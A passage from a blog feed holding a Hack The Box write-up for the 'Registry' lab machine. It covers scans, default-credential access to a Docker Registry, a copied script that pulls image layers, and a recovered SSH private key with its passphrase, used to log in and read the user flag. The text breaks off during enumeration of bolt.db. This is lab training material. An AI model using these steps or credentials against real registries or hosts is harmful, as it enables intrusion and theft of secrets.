<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://ezploisite.it/feed.xml" rel="self" type="application/atom+xml" /><link href="https://ezploisite.it/" rel="alternate" type="text/html" /><updated>2020-05-01T09:39:57+02:00</updated><id>https://ezploisite.it/feed.xml</id><title type="html">ezploisite.it</title><subtitle>Posts about security and CTFs</subtitle><author><name>Ezploisite</name><email>bomb@protonmail.com</email></author><entry><title type="html">Registry - Hack The Box</title><link href="https://ezploisite.it/htb-writeup-registry/" rel="alternate" type="text/html" title="Registry - Hack The Box" /><published>2020-05-01T00:00:00+02:00</published><updated>2020-05-01T00:00:00+02:00</updated><id>https://ezploisite.it/htb-writeup-registry</id><content type="html" xml:base="https://ezploisite.it/htb-writeup-registry/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-registry/registry_logo.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Registry was a hard box with a vulnerable Docker Registry who allow us to retrieve the ssh key for bolt. After some enumerations, we will found into bolt.db the credentials to login thourgh bolt CMS. We can upload a python reverse shell and obtain the connection with www-data. For the privesc we have sudo permission with www-data to run the restic backup which allow us to grub the root ssh key.&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;We can extract from Docker Registry some archivies which allows us to find the ssh_key for the user Bolt.&lt;/li&gt;
  &lt;li&gt;After some enumeration we find a database’s file called bolt.db where we can extract and crack the password for Bolt CMS.&lt;/li&gt;
  &lt;li&gt;Then inside Bolt we have to upload a python reverse shell and get her to Bolt connected in SSH.&lt;/li&gt;
  &lt;li&gt;For the privesc with www-data, we can run restic backup as sudo pointing to our listening restic server to get the ssh key for root.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;portscan-tcp&quot;&gt;Portscan TCP&lt;/h2&gt;

&lt;p&gt;We discover on the remote host 3 open TCP ports: 22 SSH, 80 HTTP and 442 SSL.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; nmap -sV -sC -O 10.10.10.159
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-01 06:09 CEST
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Nmap scan report for 10.10.10.159
Host is up (0.044s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
80/tcp  open  http     nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=docker.registry.htb
| Not valid before: 2019-05-06T21:14:35
|_Not valid after:  2029-05-03T21:14:35
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The SSL certificate exposes a hostname &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker.registry.htb&lt;/code&gt; that we are going to add to our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;http-recon&quot;&gt;HTTP Recon&lt;/h2&gt;

&lt;p&gt;Visiting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.159&lt;/code&gt; shows us Nginx default page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-registry/registry2.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So let’s try to brute force its directories:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; python3 /root/Documenti/joker/dirsearch/dirsearch.py -u http://10.10.10.159 -e php,txt,xml -w /usr/share/wordlists/dirbuster/directories.jbrofuzz

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt, xml | HTTP method: get | Threads: 10 | Wordlist size: 58649

Error Log: /root/Documenti/joker/dirsearch/logs/errors-20-05-01_06-28-01.log

Target: http://10.10.10.159

[06:28:01] Starting: 
[06:28:01] 200 -  612B  - /
[06:28:01] 200 -  612B  - /% 
[06:28:01] 301 -  194B  - /  -&amp;gt;  http://10.10.10.159/./
[06:28:01] 200 -  612B  - /??                    
[06:28:27] 301 -  194B  - /bolt  -&amp;gt;  http://10.10.10.159/bolt/
[06:29:59] 301 -  194B  - /install  -&amp;gt;  http://10.10.10.159/install/                 
                                                                                     
Task Completed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Great! Install and bolt are exposed! Let’s visit &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.159/bolt&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-registry/registry3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bolt is an open-source Content Management Tool. So we can try again to brute force its directories:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; python3 /root/Documenti/joker/dirsearch/dirsearch.py -u http://10.10.10.159/bolt/ -e php,txt,xml -w /usr/share/wordlists/dirbuster/directories.jbrofuzz

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt, xml | HTTP method: get | Threads: 10 | Wordlist size: 58649

Error Log: /root/Documenti/joker/dirsearch/logs/errors-20-05-01_06-39-58.log

Target: http://10.10.10.159/bolt/                                                                                                                   
                                                                                                                                                    
[06:39:58] Starting: 
[06:39:58] 200 -    8KB - /bolt/
[06:39:59] 301 -  194B  - /bolt/  -&amp;gt;  http://10.10.10.159/bolt/./
[06:39:59] 200 -    8KB - /bolt/??               
[06:40:10] 301 -  194B  - /bolt/app  -&amp;gt;  http://10.10.10.159/bolt/app/
[06:40:24] 302 -  308B  - /bolt/bolt  -&amp;gt;  /bolt/bolt/login
[06:41:15] 301 -  194B  - /bolt/extensions  -&amp;gt;  http://10.10.10.159/bolt/extensions/ 
[06:41:20] 301 -  194B  - /bolt/files  -&amp;gt;  http://10.10.10.159/bolt/files/        
[06:43:43] 301 -  194B  - /bolt/src  -&amp;gt;  http://10.10.10.159/bolt/src/               
[06:43:55] 301 -  194B  - /bolt/tests  -&amp;gt;  http://10.10.10.159/bolt/tests/
[06:43:56] 301 -  194B  - /bolt/theme  -&amp;gt;  http://10.10.10.159/bolt/theme/ 
[06:44:10] 301 -  194B  - /bolt/vendor  -&amp;gt;  http://10.10.10.159/bolt/vendor/
                                                                   
Task Completed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And visiting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.159/bolt/bolt/&lt;/code&gt; returns a login page, but we don’t have any credentials, so we gonna moving back on other stuff.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-registry/registry4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Visiting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://docker.registry.htb&lt;/code&gt; lands us on an empty page. Running dirsearch.py returns an interesting endpoint.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; python3 /root/Documenti/joker/dirsearch/dirsearch.py -u http://docker.registry.htb -e php,txt,xml -w /usr/share/wordlists/dirbuster/directories.jbrofuzz

 _|. _ _  _  _  _ _|_    v0.3.9                                                                                                                     
(_||| _) (/_(_|| (_| )                                                                                                                              
                                                                                                                                                    
Extensions: php, txt, xml | HTTP method: get | Threads: 10 | Wordlist size: 58649

Error Log: /root/Documenti/joker/dirsearch/logs/errors-20-05-01_06-53-16.log

Target: http://docker.registry.htb                                                                                                                  
                                                                                                                                                    
[06:53:16] Starting: 
[06:53:17] 200 -    0B  - /
[06:53:17] 301 -    0B  - /  -&amp;gt;  /  
[06:53:17] 301 -    0B  - /%2A%2Ahttp:/www  -&amp;gt;  /%2A%2Ahttp:/www
[06:53:17] 200 -    0B  - /??           
[06:55:06] 301 -    0B  - http://blog  -&amp;gt;  /http:/blog                               
[06:55:06] 301 -    0B  - http://www  -&amp;gt;  /http:/www
[06:55:06] 301 -    0B  - http://youtube  -&amp;gt;  /http:/youtube
[06:55:06] 301 -    0B  - http://blogs  -&amp;gt;  /http:/blogs
[06:57:35] 301 -   39B  - /v2  -&amp;gt;  /v2/                                              
                                                                   
Task Completed 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;docker-container-recon&quot;&gt;Docker Container Recon&lt;/h2&gt;

&lt;p&gt;Visiting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker.registry.htb/v2/&lt;/code&gt; we will prompt for a login form, that we can easily pass with credentials &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-registry/registry5.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There’s an interesting header we see in the response &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Docker-Distribution-Api-Version registry/2.0&lt;/code&gt;. Googling the above header, we can see the Docker Registry API documentation &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://docs.docker.com/registry/spec/api/#listing-repositories&lt;/code&gt; which helpfully detailed the anatomy of a docker registry hack. Following their lead, let’s list the repos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-registry/registry6.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-registry/registry7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-registry/registry8.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Well. This docker registry is not so secure as it seems. In fact we can use an exploit in python from here &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://github.com/NotSoSecure/docker_fetch/&lt;/code&gt; to fetch some more results:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import os
import json
import optparse
import requests

# pulls Docker Images from unauthenticated docker registry api. 
# and checks for docker misconfigurations. 

apiversion = &quot;v2&quot;
final_list_of_blobs = []

 
# Disable insecure request warning 
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action=&quot;store&quot;, dest=&quot;url&quot;, help=&quot;URL Endpoint for Docker Registry API v2. Eg https://IP:Port&quot;, default=&quot;spam&quot;)
options, args = parser.parse_args()
url = options.url
headers = {&quot;Authorization&quot;: &quot;Basic YWRtaW46YWRtaW4=&quot; }


def list_repos():
 req = requests.get(url+ &quot;/&quot; + apiversion + &quot;/_catalog&quot;, verify=False,headers=headers)
        print req.text
 return json.loads(req.text)[&quot;repositories&quot;]

def find_tags(reponame):
 req = requests.get(url+ &quot;/&quot; + apiversion + &quot;/&quot; + reponame+&quot;/tags/list&quot;, verify=False,headers=headers )
 print &quot;\n&quot;
 data =  json.loads(req.content)
 if &quot;tags&quot; in data:
  return data[&quot;tags&quot;]


def list_blobs(reponame,tag):
 req = requests.get(url+ &quot;/&quot; + apiversion + &quot;/&quot; + reponame+&quot;/manifests/&quot; + tag, verify=False,headers=headers )
 data = json.loads(req.content)
 if &quot;fsLayers&quot; in data:
  for x in data[&quot;fsLayers&quot;]:
   curr_blob = x['blobSum'].split(&quot;:&quot;)[1]
   if curr_blob not in final_list_of_blobs:
    final_list_of_blobs.append(curr_blob)

def download_blobs(reponame, blobdigest,dirname):
 req = requests.get(url+ &quot;/&quot; + apiversion + &quot;/&quot; + reponame +&quot;/blobs/sha256:&quot; + blobdigest, verify=False,headers=headers)
 filename = &quot;%s.tar.gz&quot; % blobdigest
 with open(dirname + &quot;/&quot; + filename, 'wb') as test:
  test.write(req.content)

def main(): 
 if url is not &quot;spam&quot;:
  list_of_repos = list_repos()
  print &quot;\n[+] List of Repositories:\n&quot;
  for x in list_of_repos:
   print x
  target_repo = raw_input(&quot;\nWhich repo would you like to download?:  &quot;)
  if target_repo in list_of_repos:
   tags = find_tags(target_repo)
   if tags is not None:
    print &quot;\n[+] Available Tags:\n&quot;
    for x in tags:
     print x

    target_tag = raw_input(&quot;\nWhich tag would you like to download?:  &quot;)
    if target_tag in tags:
     list_blobs(target_repo,target_tag)

     dirname = raw_input(&quot;\nGive a directory name:  &quot;)
     os.makedirs(dirname)
     print &quot;Now sit back and relax. I will download all the blobs for you in %s directory. \nOpen the directory, unzip all the files and explore like a Boss. &quot; % dirname
     for x in final_list_of_blobs:
      print &quot;\n[+] Downloading Blob: %s&quot; % x
      download_blobs(target_repo,x,dirname)
    else:
     print &quot;No such Tag Available. Qutting....&quot;
   else:
    print &quot;[+] No Tags Available. Quitting....&quot;
  else:
   print &quot;No such repo found. Quitting....&quot;
 else:
  print &quot;\n[-] Please use -u option to define API Endpoint, e.g. https://IP:Port\n&quot;


if __name__ == &quot;__main__&quot;:
 main()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo registry -&amp;gt; python exp.py -u http://docker.registry.htb
{&quot;repositories&quot;:[&quot;bolt-image&quot;]}


[+] List of Repositories:

bolt-image

Which repo would you like to download?:  bolt-image



[+] Available Tags:

latest

Which tag would you like to download?:  latest

Give a directory name:  catalog
Now sit back and relax. I will download all the blobs for you in catalog directory. 
Open the directory, unzip all the files and explore like a Boss. 

[+] Downloading Blob: 302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b

[+] Downloading Blob: 3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee

[+] Downloading Blob: 02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c

[+] Downloading Blob: c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7

[+] Downloading Blob: 2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791

[+] Downloading Blob: a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4

[+] Downloading Blob: f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0

[+] Downloading Blob: d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a

[+] Downloading Blob: 8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797

[+] Downloading Blob: f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo registry -&amp;gt; ls
catalog  exp.py
root@lorenzooo registry -&amp;gt; cd catalog
root@lorenzooo catalog -&amp;gt; ls
02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c.tar.gz  a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4.tar.gz
2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791.tar.gz  c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7.tar.gz
302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b.tar.gz  d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a.tar.gz
3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee.tar.gz  f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff.tar.gz
8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797.tar.gz  f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0.tar.gz
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;entry-point-with-bolt&quot;&gt;Entry point with Bolt&lt;/h2&gt;

&lt;p&gt;I extracted all the archivies in the same folder. So, let’s enumerate the file system:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo catalog -&amp;gt; cd root
root@lorenzooo catalog -&amp;gt; ls
root@lorenzooo root -&amp;gt; find . -type f
./.bashrc
./.viminfo
./.ssh/known_hosts
./.ssh/id_rsa.pub
./.ssh/id_rsa
./.ssh/config
./.bash_history
./.profile
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo root -&amp;gt; cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,1C98FA248505F287CCC597A59CF83AB9

KF9YHXRjDZ35Q9ybzkhcUNKF8DSZ+aNLYXPL3kgdqlUqwfpqpbVdHbMeDk7qbS7w
KhUv4Gj22O1t3koy9z0J0LpVM8NLMgVZhTj1eAlJO72dKBNNv5D4qkIDANmZeAGv
7RwWef8FwE3jTzCDynKJbf93Gpy/hj/SDAe77PD8J/Yi01Ni6MKoxvKczL/gktFL
/mURh0vdBrIfF4psnYiOcIDCkM2EhcVCGXN6BSUxBud+AXF0QP96/8UN8A5+O115
p7eljdDr2Ie2LlF7dhHSSEMQG7lUqfEcTmsqSuj9lBwfN22OhFxByxPvkC6kbSyH
XnUqf+utie21kkQzU1lchtec8Q4BJIMnRfv1kufHJjPFJMuWFRbYAYlL7ODcpIvt
UgWJgsYyquf/61kkaSmc8OrHc0XOkif9KE63tyWwLefOZgVgrx7WUNRNt8qpjHiT
nfcjTEcOSauYmGtXoEI8LZ+oPBniwCB4Qx/TMewia/qU6cGfX9ilnlpXaWvbq39D
F1KTFBvwkM9S1aRJaPYu1szLrGeqOGH66dL24f4z4Gh69AZ5BCYgyt3H2+FzZcRC
iSnwc7hdyjDI365ZF0on67uKVDfe8s+EgXjJWWYWT7rwxdWOCzhd10TYuSdZv3MB
TdY/nF7oLJYyO2snmedg2x11vIG3fVgvJa9lDfy5cA9teA3swlOSkeBqjRN+PocS
5/9RBV8c3HlP41I/+oV5uUTInaxCZ/eVBGVgVe5ACq2Q8HvW3HDvLEz36lTw+kGE
SxbxZTx1CtLuyPz7oVxaCStn7Cl582MmXlp/MBU0LqodV44xfhnjmDPUK6cbFBQc
GUeTlxw+gRwby4ebLLGdTtuYiJQDlZ8itRMTGIHLyWJEGVnO4MsX0bAOnkBRllhA
CqceFXlVE+K3OfGpo3ZYj3P3xBeDG38koE2CaxEKQazHc06aF5zlcxUNBusOxNK4
ch2x+BpuhB0DWavdonHj+ZU9nuCLUhdy3kjg0FxqgHKZo3k55ai+4hFUIT5fTNHA
iuMLFSAwONGOf+926QUQd1xoeb/n8h5b0kFYYVD3Vkt4Fb+iBStVG6pCneN2lILq
rSVi9oOIy+NRrBg09ZpMLXIQXLhHSk3I7vMhcPoWzBxPyMU29ffxouK0HhkARaSP
3psqRVI5GPsnGuWLfyB2HNgQWNHYQoILdrPOpprxUubnRg7gExGpmPZALHPed8GP
pLuvFCgn+SCf+DBWjMuzP3XSoN9qBSYeX8OKg5r3V19bhz24i2q/HMULWQ6PLzNb
v0NkNzCg3AXNEKWaqF6wi7DjnHYgWMzmpzuLj7BOZvLwWJSLvONTBJDFa4fK5nUH
UnYGl+WT+aYpMfp6vd6iMtet0bh9wif68DsWqaqTkPl58z80gxyhpC2CGyEVZm/h
P03LMb2YQUOzBBTL7hOLr1VuplapAx9lFp6hETExaM6SsCp/StaJfl0mme8tw0ue
QtwguqwQiHrmtbp2qsaOUB0LivMSzyJjp3hWHFUSYkcYicMnsaFW+fpt+ZeGGWFX
bVpjhWwaBftgd+KNg9xl5RTNXs3hjJePHc5y06SfOpOBYqgdL42UlAcSEwoQ76VB
YGk+dTQrDILawDDGnSiOGMrn4hzmtRAarLZWvGiOdppdIqsfpKYfUcsgENjTK95z
zrey3tjXzObM5L1MkjYYIYVjXMMygJDaPLQZfZTchUNp8uWdnamIVrvqHGvWYES/
FGoeATGL9J5NVXlMA2fXRue84sR7q3ikLgxDtlh6w5TpO19pGBO9Cmg1+1jqRfof
eIb4IpAp01AVnMl/D/aZlHb7adV+snGydmT1S9oaN+3z/3pHQu3Wd7NWsGMDmNdA
+GB79xf0rkL0E6lRi7eSySuggposc4AHPAzWYx67IK2g2kxx9M4lCImUO3oftGKJ
P/ccClA4WKFMshADxxh/eWJLCCSEGvaLoow+b1lcIheDYmOxQykBmg5AM3WpTpAN
T+bI/6RA+2aUm92bNG+P/Ycsvvyh/jFm5vwoxuKwINUrkACdQ3gRakBc1eH2x014
6B/Yw+ZGcyj738GHH2ikfyrngk1M+7IFGstOhUed7pZORnhvgpgwFporhNOtlvZ1
/e9jJqfo6W8MMDAe4SxCMDujGRFiABU3FzD5FjbqDzn08soaoylsNQd/BF7iG1RB
Y7FEPw7yZRbYfiY8kfve7dgSKfOADj98fTe4ISDG9mP+upmR7p8ULGvt+DjbPVd3
uN3LZHaX5ECawEt//KvO0q87TP8b0pofBhTmJHUUnVW2ryKuF4IkUM3JKvAUTSg8
K+4aT7xkNoQ84UEQvfZvUfgIpxcj6kZYnF+eakV4opmgJjVgmVQvEW4nf6ZMBRo8
TTGugKvvTw/wNKp4BkHgXxWjyTq+5gLyppKb9sKVHVzAEpew3V20Uc30CzOyVJZi
Bdtfi9goJBFb6P7yHapZ13W30b96ZQG4Gdf4ZeV6MPMizcTbiggZRBokZLCBMb5H
pgkPgTrGJlbm+sLu/kt4jgex3T/NWwXHVrny5kIuTbbv1fXfyfkPqU66eysstO2s
OxciNk4W41o9YqHHYM9D/uL6xMqO3K/LTYUI+LcCK13pkjP7/zH+bqiClfNt0D2B
Xg6OWYK7E/DTqX+7zqNQp726sDAYKqQNpwgHldyDhOG3i8o66mLj3xODHQzBvwKR
bJ7jrLPW+AmQwo/V8ElNFPyP6oZBEdoNVn/plMDAi0ZzBHJc7hJ0JuHnMggWFXBM
PjxG/w4c8XV/Y2WavafEjT7hHuviSo6phoED5Zb3Iu+BU+qoEaNM/LntDwBXNEVu
Z0pIXd5Q2EloUZDXoeyMCqO/NkcIFkx+//BDddVTFmfw21v2Y8fZ2rivF/8CeXXZ
ot6kFb4G6gcxGpqSZKY7IHSp49I4kFsC7+tx7LU5/wqC9vZfuds/TM7Z+uECPOYI
f41H5YN+V14S5rU97re2w49vrBxM67K+x930niGVHnqk7t/T1jcErROrhMeT6go9
RLI9xScv6aJan6xHS+nWgxpPA7YNo2rknk/ZeUnWXSTLYyrC43dyPS4FvG8N0H1V
94Vcvj5Kmzv0FxwVu4epWNkLTZCJPBszTKiaEWWS+OLDh7lrcmm+GP54MsLBWVpr
-----END RSA PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo .ssh -&amp;gt; cat config
Host registry
  User bolt
  Port 22
  Hostname registry.htb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo catalog -&amp;gt; cd etc
root@lorenzooo etc -&amp;gt; cd profile.d
root@lorenzooo profile.d -&amp;gt; ls
01-locale-fix.sh  01-ssh.sh  02-ssh.sh
root@lorenzooo profile.d -&amp;gt; cat 01-ssh.sh
#!/bin/bash
eval `ssh-agent -s`
root@lorenzooo profile.d -&amp;gt; cat 02-ssh.sh
#!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect &quot;Enter passphrase for /root/.ssh/id_rsa:&quot;
send &quot;GkOcz221Ftb3ugog\n&quot;;
expect &quot;Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)&quot;
interact
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After a lot of enumeration, we got the id_rsa for bolt, his passphrase and the hostname to connect thourgh ssh.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo .ssh -&amp;gt; ssh -i id_rsa bolt@registry.htb
The authenticity of host 'registry.htb (10.10.10.159)' can't be established.
ECDSA key fingerprint is SHA256:G1J5ek/T6KuCCT7Xp2IN1LUslRt24mhmhKUo/kWWVrs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'registry.htb,10.10.10.159' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

  System information as of Fri May  1 04:10:13 UTC 2020

  System load:  0.0               Users logged in:                0
  Usage of /:   5.7% of 61.80GB   IP address for eth0:            10.10.10.159
  Memory usage: 26%               IP address for br-1bad9bd75d17: 172.18.0.1
  Swap usage:   0%                IP address for docker0:         172.17.0.1
  Processes:    154
Last login: Mon Oct 21 10:31:48 2019 from 10.10.14.2
bolt@bolt:~$ pwd
/home/bolt
bolt@bolt:~$ ls
user.txt
bolt@bolt:~$ cat user.txt
ytc0ytdmnzywnzgxngi0zte0otm3ywzi 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;lateral-with-www-data&quot;&gt;Lateral with www-data&lt;/h2&gt;

&lt;p&gt;Again, after some deep enumeration on the file system, we found on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html&lt;/code&gt; an interesting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backup.php&lt;/code&gt; file:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bolt@bolt:/var/www/html$ cat backup.php
&amp;lt;?php shell_exec(&quot;sudo restic backup -r rest:http://backup.registry.htb/bolt bolt&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can assume that the user www-data has sudo permission on restic binary, since bolt cms is running as www-data user.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bolt@bolt:/var/www/html$ cd bolt
bolt@bolt:/var/www/html/bolt$ cd app
bolt@bolt:/var/www/html/bolt/app$ cd database
bolt@bolt:/var/www/html/bolt/app/database$ ls -lah
total 300K
drwxrwxr-x 2 www-data www-data 4.0K Oct 21  2019 .
drwxrwxr-x 9 www-data www-data 4.0K Oct 21  2019 ..
-rw-r--r-- 1 www-data www-data 288K May  1 02:52 bolt.db
-rw-rw-r-- 1 www-data www-data  170 Oct  8  2019 .gitignore
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There is another interesting file inside the database: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bolt.db&lt;/code&gt;. So, we can download it in local and try to fetch some things from it_&lt;/p&gt;

